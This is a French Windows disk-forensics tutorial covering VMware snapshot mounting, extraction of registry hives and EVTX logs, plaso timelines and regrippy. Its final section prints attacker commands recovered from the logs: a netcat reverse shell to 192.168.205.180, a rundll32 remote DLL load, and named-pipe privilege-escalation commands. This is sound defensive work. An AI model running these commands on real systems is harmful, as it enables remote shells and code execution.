@@ -1,0 +1,210 @@
+# Forensic Windows - Données provenant des disques dur
+
+# 1. Prélévement
+
+Pour effectuer une investigation numérique, l'analyste va devoir prélever les données des différents supports. Une fois prélevées, les données seront traitées puis analysées.
+
+## Vmware 
+
+```
+root@kali# ll
+total 25873880
+drwxrwxrwx 1 root root      32768 Jan 17 04:16  .
+drwxrwxrwx 1 root root      20480 Jan 23 14:52  ..
+-rwxrwxrwx 1 root root     199993 Jan 17 04:01  vmware.log
+-rwxrwxrwx 2 root root  561315840 Jan 15 03:32 'Windows Server 2016-000001-s001.vmdk'
+-rwxrwxrwx 2 root root  202964992 Jan 15 03:32 'Windows Server 2016-000001-s002.vmdk'
+-rwxrwxrwx 2 root root 1003618304 Jan 15 03:32 'Windows Server 2016-000001-s003.vmdk'
+-rwxrwxrwx 2 root root  244449280 Jan 15 03:32 'Windows Server 2016-000001-s004.vmdk'
+-rwxrwxrwx 2 root root     524288 Dec 17 07:15 'Windows Server 2016-000001-s005.vmdk'
+-rwxrwxrwx 2 root root     524288 Dec 17 07:15 'Windows Server 2016-000001-s006.vmdk'
+-rwxrwxrwx 2 root root     524288 Dec 17 07:15 'Windows Server 2016-000001-s007.vmdk'
+..
+-rwxrwxrwx 2 root root 4294967296 Dec 17 07:20 'Windows Server 2016-Snapshot1.vmem'
+-rwxrwxrwx 2 root root    5561726 Dec 17 07:20 'Windows Server 2016-Snapshot1.vmsn'
+-rwxrwxrwx 2 root root 4294967296 Jan 15 03:36 'Windows Server 2016-Snapshot2.vmem'
+-rwxrwxrwx 2 root root    4141100 Jan 15 03:36 'Windows Server 2016-Snapshot2.vmsn'
+-rwxrwxrwx 2 root root       1286 Dec 17 04:22 'Windows Server 2016.vmdk'
+-rwxrwxrwx 2 root root        851 Jan 15 03:32 'Windows Server 2016.vmsd'
+-rwxrwxrwx 2 root root       3034 Jan 17 04:01 'Windows Server 2016.vmx'
+-rwxrwxrwx 2 root root       3606 Dec 17 07:06 'Windows Server 2016.vmxf'
+```
+A ce moment là, nous pouvons constater que le serveur compte deux snapshots.
+Nous avons donc 51 fichiers ".vmdk" ....Quel disque utiliser pour analyser notre serveur virtuel ?
+Seul le fichier ".vmdk" identifié au sein de la configuration de la machine virtuelle est à prendre en compte.
+
+```
+root@kali# cat Windows\ Server\ 2016.vmx | grep -i vmdk
+scsi0:0.fileName = "Windows Server 2016-000002.vmdk"
+```
+
+Dans notre cas nous avons utilisé le fichier "Windows Server 2016-000002.vmdk" correspondant au disque dur virtuel généré lors de la création du second snapshot.
+
+
+Le fichier "Windows Server 2016-000002.vmdk" n'est pas exploitable dans l'état actuel des choses. En effet, il ne s'agit que d'un delta des données modifiées depuis le précédent snapshot. Il est donc nécessaire de fusionner de manière logique tous les snapshots afin d'obtenir une situation actuelle du système de fichiers.
+L'outil "qemu-nbd" est parfait pour cela.
+
+
+```
+root@kali# modinfo nbd
+root@kali# modprobe nbd max-part=4
+root@kali# qemu-nbd -c /dev/nbd0 Windows\ Server\ 2016-000002.vmdk
+```
+
+Une fois les différents traitements effectués, le périphérique pourra être démonté via la commande :
+
+```
+root@kali# qemu-nbd -d /dev/nbd0
+```
+
+Nous obtenons après l'exécution de ces quelques commandes un périphérique de stockage nommé "/dev/nbd0"  representant le disque dur global du serveur virtuel.
+Il est désormais possible de visualiser les différentes partitions le constituant.
+
+```
+root@kali# mmls /dev/nbd0
+GUID Partition Table (EFI)
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Safety Table
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  Meta      0000000001   0000000001   0000000001   GPT Header
+003:  Meta      0000000002   0000000033   0000000032   Partition Table
+004:  000       0000002048   0000923647   0000921600   Basic data partition
+005:  001       0000923648   0001126399   0000202752   EFI system partition
+006:  002       0001126400   0001159167   0000032768   Microsoft reserved partition
+007:  003       0001159168   0125827071   0124667904   Basic data partition
+008:  -------   0125827072   0125829119   0000002048   Unallocated
+```
+
+
+# 2. Traitement des données
+
+## Extraction des fichiers sensibles
+
+Comme nous avons pu le voir précédemment, la partition contenant les données du système d'exploitation sont stockées sur la quatrieme partition. Avant de se lancer dans les traitements assez longs, nous avons extraits les fichiers systèmes contenant les données les plus importantes telles que :
+
+* Base de registre
+* Base SAM
+* Fichiers contenant les journaux d'évenements
+
+
+Nous avons donc recensé, grâce aux outils de la suite Sleuthkit, tous les fichiers présents sur cette partition afin d'identifier les inodes correspondants aux artefacts.
+
+
+```
+root@kali# apt install -y sleuthkit
+root@kali# fls -a -h -p -r /dev/nbd0p4 
+..
+
+r/r 100306-128-3:       Windows/System32/config/SAM
+r/r 100308-128-3:       Windows/System32/config/SECURITY
+r/r 103559-128-3:       Windows/System32/config/SOFTWARE
+r/r 100445-128-3:       Windows/System32/config/SYSTEM
+..
+r/r 104835-128-4:       Users/Administrator/NTUSER.DAT
+r/r 46531-128-4:        Users/Administrator.DSSTARK/NTUSER.DAT
+r/r 22358-128-4:        Users/pepper.potts/NTUSER.DAT
+
+r/r 103970-128-4:       Windows/System32/winevt/Logs/Application.evtx
+r/r 103971-128-4:	Windows/System32/winevt/Logs/Security.evtx
+r/r 39-128-4:   	Windows/System32/winevt/Logs/Setup.evtx
+r/r 103969-128-4:       Windows/System32/winevt/Logs/System.evtx
+r/r 103972-128-4:       Windows/System32/winevt/Logs/Windows PowerShell.evtx
+r/r 62-128-4:   	Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Admin.evtx
+r/r 59-128-4:   	Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx
+
+```
+
+Il est indispensable de récupérer le fichier NTUSER.DAT du compte Administrator, car il correspond à la ruche "HKEY_CURRENT_USER" de la base de registre.
+
+Maintenant que les inodes ont été identifiés, nous avons utilisés l'outil "icat" pour les extraire du dump.
+
+```
+root@kali# icat /dev/nbd0p4 100306-128-3 > SAM
+root@kali# icat /dev/nbd0p4 100308-128-3 > SECURITY
+root@kali# icat /dev/nbd0p4 103559-128-3 > SOFTWARE
+root@kali# icat /dev/nbd0p4 100445-128-3 > SYSTEM
+root@kali# icat /dev/nbd0p4 104835-128-4 > NTUSER_administrator_local.DAT
+root@kali# icat /dev/nbd0p4 46531-128-4 > NTUSER_administrator.dsstark.DAT
+root@kali# icat /dev/nbd0p4 22358-128-4 > NTUSER_pepper.potts.dsstark.DAT
+
+root@kali# icat /dev/nbd0p4 103970-128-4 > Application.evtx
+root@kali# icat /dev/nbd0p4 103971-128-4 > Security.evtx
+root@kali# icat /dev/nbd0p4 39-128-4 > Setup.evtx
+root@kali# icat /dev/nbd0p4 103969-128-4 > System.evtx
+root@kali# icat /dev/nbd0p4 103972-128-4 > Windows_PowerShell.evtx
+root@kali# icat /dev/nbd0p4 62-128-4 > Microsoft_Windows_PowerShell_Admin.evtx
+root@kali# icat /dev/nbd0p4 59-128-4 > Microsoft_Windows_PowerShell_Operational.evtx
+```
+
+## Génération d'une timeline à partir des artefacts
+
+Une fois que les données ont été prélevées, il est nécessaire de s'attaquer à leur traitement en vue de les analyser. L'objectif de cette étape est de générer une timeline des actions menées sur le système à partir des événements systèmes survenus.
+Pour effectuer cette tâche, nous avons utilisé les outils "log2timeline" et "psort". Ils sont complémentaires, le premier extrait les différents artefacts des données présentes sur le disque dur et les stocke dans une base de données SQLITE. 
+
+Lors de la génération log2timeline va parcourir l'intégralité du périphérique passé en paramètre. Il analysera ainsi chacun des fichiers trouvé. Pour optimiser le temps de génération, il est ainsi possible de fournir un filtre indiquant à log2timeline d'analyser uniquement les fichiers important du système windows.
+
+```
+root@kali# log2timeline.py -f /mnt/hgfs/filter_windows.txt  -z UTC --volumes all --partitions all --no_dependencies_check vm_server.plaso /dev/nbd0
+```
+
+Cette base de données est ensuite parcourue par "psort" pour exporter les événements dans différents formats tels que csv,json ou elasticsearch. Dans notre cas nous avons utilisé Elasticsearch qui permet d'indexer de très gros volumes de données très rapidement. Il a l'avantage de fournir kibana, un outil offrant un système de requêtage et une visualisation des données. 
+
+```
+root@kali# psort.py -z UTC -o elastic --server 127.0.0.1 --port 9200 --flush_interval 50 --raw_fields --index_name timeline-plaso --process_memory_limit 294967296 vm_server.plaso
+```
+
+
+# 3. Analyse
+
+
+## Elastalert
+
+Elastalert est un outil opensource qui va effectuer des requêtes sur une instance elasticsearch. Ces recherches découlent directement de règles de détection et vont permettre d'enrichir un nouvel index avec les résultats correspondant à des événements de sécurité.
+
+\\
+Source: https://github.com/Yelp/elastalert
+
+```
+root@kali# git clone https://github.com/Yelp/elastalert.git
+```
+
+## Base de registre
+
+Il est maintenant possible d'accéder aux données contenues dans ces ruches via l'outil "regrippy" du CERT de Airbus.
+
+```
+root@kali# pip3 install regrippy
+
+root@kali# /usr/local/bin/regrip.py --system SYSTEM --software SOFTWARE --sam SAM --ntuser NTUSER_pepper.potts.dsstark.DAT timezone            
+ROOT\ControlSet001\Control\TimeZoneInformation => TimeZoneKeyName [Pacific Standard Time]
+
+root@kali# /usr/local/bin/regrip.py --system SYSTEM --software SOFTWARE --sam SAM --ntuser NTUSER_pepper.potts.dsstark.DAT services > registry_services
+root@kali# cat registry_services |egrep -i '(user\\|temp\\|tmp\\|cmd.exe|cmd |powershell)'
+```
+
+## EVTX - journaux d'évenements
+### libevtx-utils
+
+```
+root@kali# apt install libevtx-utils
+root@kali# evtxexport  Security.evtx > security_evtx_export.txt
+root@kali# evtxexport  Application.evtx > application_evtx_export.txt
+root@kali# evtxexport  System.evtx > system_evtx_export.txt
+```
+
+Une fois traités, les fichiers peuvent être analysés très rapidement avec la commande suivante : 
+
+```
+root@kali# cat *_evtx_* | egrep -i '(powershell|cmd.exe|cmd\ )'
+String: 9			: nc64.exe  -e powershell 192.168.205.180 443
+String: 9			: "cmd.exe" /C uname -a
+String: 9			: "cmd.exe" /C cat /etc/issue
+String: 9			: "cmd.exe" /C id
+String: 9			: "cmd.exe" /C rundll32.exe \\192.168.205.180\XzmKO\inject.dll,0
+String: 6			: cmd.exe /c echo vebiob > \\.\pipe\vebiob
+String: 2			: cmd.exe /c echo mwrskv > \\.\pipe\mwrskv
+```
+
